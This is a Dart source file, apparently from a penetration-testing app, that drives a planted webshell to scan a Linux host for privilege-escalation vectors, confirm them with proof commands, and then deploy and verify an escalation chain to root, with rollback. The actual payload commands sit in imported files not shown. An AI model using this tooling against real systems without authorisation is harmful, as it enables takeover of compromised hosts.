import 'dart:async';

import '../services/webshell_service.dart';
import 'priv_esc_landing.dart';
import 'priv_esc_risk.dart';
import 'priv_esc_vectors.dart';

/// Whether a command output is a transport/connector error string.
bool isErrorOutput(String out) =>
    out.startsWith('[Error]') ||
    out.startsWith('[Timeout]') ||
    out.startsWith('[HTTP') ||
    out.startsWith('[Connection Error]');

/// Deploy command reported success (`DEPLOY_OK` marker).
bool parseDeploySuccess(String out) => out.contains('DEPLOY_OK');

/// Verify command proved root (a `VERIFY_OK:` marker or an `id` uid=0 line).
bool parseVerifySuccess(String out) =>
    out.contains('VERIFY_OK') ||
    out.contains('euid=0(root)') ||
    out.contains('uid=0(root)');

/// Whether a harmless proof output proves effective-root execution.
bool proofSucceeded(String proofOutput, List<String> markers) {
  final normalized = proofOutput.trim();
  if (normalized.isEmpty || isErrorOutput(normalized)) return false;
  return markers.any(normalized.contains);
}

/// Result of running a generated chain.
class PrivEscChainResult {
  const PrivEscChainResult({
    required this.deployOk,
    required this.deployOutput,
    required this.verifyOk,
    required this.verifyOutput,
    this.rollbackCommand,
    required this.verifyStrength,
  });

  final bool deployOk;
  final String deployOutput;
  final bool verifyOk;
  final String verifyOutput;
  final String? rollbackCommand;
  final LandingVerifyStrength verifyStrength;

  bool get fullyVerified => deployOk && verifyOk;
}

/// Run a generated chain: deploy → (pause) → verify.
Future<PrivEscChainResult> executeChain(
  WebshellService service,
  PrivEscChain chain,
) async {
  String deployOutput;
  try {
    deployOutput = await service.executeCommand(chain.deployCommand);
  } catch (e) {
    return PrivEscChainResult(
      deployOk: false,
      deployOutput: '[Error] $e',
      verifyOk: false,
      verifyOutput: '',
      rollbackCommand: chain.rollbackCommand,
      verifyStrength: chain.verifyStrength,
    );
  }

  if (isErrorOutput(deployOutput) || !parseDeploySuccess(deployOutput)) {
    return PrivEscChainResult(
      deployOk: false,
      deployOutput: deployOutput,
      verifyOk: false,
      verifyOutput: '',
      rollbackCommand: chain.rollbackCommand,
      verifyStrength: chain.verifyStrength,
    );
  }

  await Future.delayed(const Duration(milliseconds: 500));

  String verifyOutput;
  try {
    verifyOutput = await service.executeCommand(chain.verifyCommand);
  } catch (e) {
    return PrivEscChainResult(
      deployOk: true,
      deployOutput: deployOutput,
      verifyOk: false,
      verifyOutput: '[Error] $e',
      rollbackCommand: chain.rollbackCommand,
      verifyStrength: chain.verifyStrength,
    );
  }

  return PrivEscChainResult(
    deployOk: true,
    deployOutput: deployOutput,
    verifyOk: !isErrorOutput(verifyOutput) && parseVerifySuccess(verifyOutput),
    verifyOutput: verifyOutput,
    rollbackCommand: chain.rollbackCommand,
    verifyStrength: chain.verifyStrength,
  );
}

/// Output of a full scan.
class PrivEscScanResult {
  const PrivEscScanResult({
    required this.risks,
    required this.incomplete,
    required this.currentUser,
  });

  final List<PrivEscRisk> risks;
  final bool incomplete;
  final String currentUser;
}

/// Orchestrates probe → detect → confirm across the vector table.
class PrivEscScanner {
  const PrivEscScanner(this.service);

  final WebshellService service;

  Future<PrivEscScanResult> scan({
    void Function(int done, int total)? onProgress,
  }) async {
    var currentUser = '';
    try {
      final u = await service.executeCommand('id -un');
      if (!isErrorOutput(u)) currentUser = u.trim();
    } catch (_) {
      // currentUser stays empty; sudoers landing falls back to a literal.
    }

    final risks = <PrivEscRisk>[];
    var incomplete = false;
    var done = 0;
    final total = vectors.length;

    for (final vector in vectors) {
      try {
        final out = await service.executeCommand(vector.probeCommand);
        final candidates = vector.detect(out);

        for (final c in candidates) {
          if (c.gtfo != null) {
            // Primitive: run a harmless proof before declaring it exploitable.
            final proofCmd = buildProofCommand(c);
            if (proofCmd == null) continue;
            try {
              final proofOut = await service.executeCommand(proofCmd);
              if (proofSucceeded(proofOut, c.gtfo!.proofMarkers)) {
                risks.add(
                  PrivEscRisk(
                    title: vector.title,
                    evidence: c.evidence,
                    level: PrivEscRiskLevel.confirmed,
                    hasDirectPrivilegeProof: true,
                    verificationCommands: [proofCmd],
                    checkCommand: vector.probeCommand,
                    rawOutput: proofOut,
                    candidate: c,
                  ),
                );
              } else {
                // Proof ran but did not confirm escalation — surface it as an
                // informational lead instead of silently dropping it, so the
                // "unusable" option is still listed.
                risks.add(
                  PrivEscRisk(
                    title: vector.title,
                    evidence:
                        '${c.evidence} 但无害验证未确认提权，本通道无法直接利用。',
                    level: PrivEscRiskLevel.informational,
                    hasDirectPrivilegeProof: false,
                    checkCommand: proofCmd,
                    rawOutput: proofOut,
                  ),
                );
              }
            } catch (_) {
              incomplete = true;
            }
          } else if (vector.directLanding != null) {
            // Fused: writable target is itself the proof — no further verify.
            risks.add(
              PrivEscRisk(
                title: vector.title,
                evidence: c.evidence,
                level: PrivEscRiskLevel.confirmed,
                hasDirectPrivilegeProof: true,
                checkCommand: vector.probeCommand,
                rawOutput: out,
                candidate: c,
              ),
            );
          } else {
            // Lead only — informational, not exploitable over this channel.
            risks.add(
              PrivEscRisk(
                title: vector.title,
                evidence: c.evidence,
                level: PrivEscRiskLevel.informational,
                hasDirectPrivilegeProof: false,
                checkCommand: vector.probeCommand,
                rawOutput: out,
              ),
            );
          }
        }
      } catch (_) {
        incomplete = true;
      }
      done++;
      onProgress?.call(done, total);
    }

    return PrivEscScanResult(
      risks: risks,
      incomplete: incomplete,
      currentUser: currentUser,
    );
  }
}
